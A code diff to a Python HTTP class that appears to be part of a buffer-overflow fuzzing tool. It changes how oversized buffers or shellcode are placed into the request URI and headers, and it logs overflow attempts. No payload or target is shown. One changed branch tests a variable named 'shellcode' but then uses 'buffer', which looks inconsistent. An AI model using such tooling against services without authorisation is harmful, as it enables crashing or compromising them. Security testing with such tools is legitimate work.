@@ -50,9 +50,12 @@ class Http():
 
         if (field.upper() == "URI"):
             field_default = True
-            request_header = self.config.http_method + " /" + str(buffer.decode("latin-1")) + "HTTP/1.1\r\n"
+            if (isinstance(shellcode, (bytes))):
+                request_header = self.config.http_method + " /" + str(buffer.decode("latin-1")) + " HTTP/1.1\r\n"
+            else:
+                request_header = self.config.http_method + " /" + buffer + " HTTP/1.1\r\n"
         else:
-            request_header = self.config.http_method + " /" + self.config.http_uri + "HTTP/1.1\r\n"
+            request_header = self.config.http_method + " /" + self.config.http_uri + " HTTP/1.1\r\n"
 
         for key in header_skeleton:
             # print(header_skeleton[key])
@@ -60,7 +63,10 @@ class Http():
 
             if (field.upper() == key.upper()):
                 field_default = True
-                request_header += key + ": " + str(buffer.decode("latin-1")) + "\r\n"
+                if (isinstance(buffer, (bytes))):
+                    request_header += key + ": " + str(buffer.decode("latin-1")) + "\r\n"
+                else:
+                    request_header += key + ": " + buffer + "\r\n"
             else:
                 # print(key, type(key), header_skeleton[key], (type(header_skeleton[key])), (isinstance(header_skeleton[key], (str, unicode))))
 
@@ -133,15 +139,15 @@ class Http():
 
         streaming = [True]
         while len(streaming) > 0:
-            self.make_request(ip, port, field, None, None, size)
+            self.request = self.make_request(ip, port, field, None, None, size)
 
             print('[.] Trying to overflow [' + str(size) + ' bytes]')
 
-            streaming = (self.inject(ip, port, self.request, None, None))
+            streaming = (self.inject(ip, port, field, self.request, None))
 
             if (len(streaming) > 0):
-                streaming[-1].strip()
-                _response = streaming[-1].split(' ')
+                # streaming[-1].strip()
+                # _response = streaming[-1].split(' ')
 
                 # print("[!] ERROR COMMUNICATING TO THE SERVICE " + "|".join(streaming))
                 # responsecode = int(_response[0].strip())
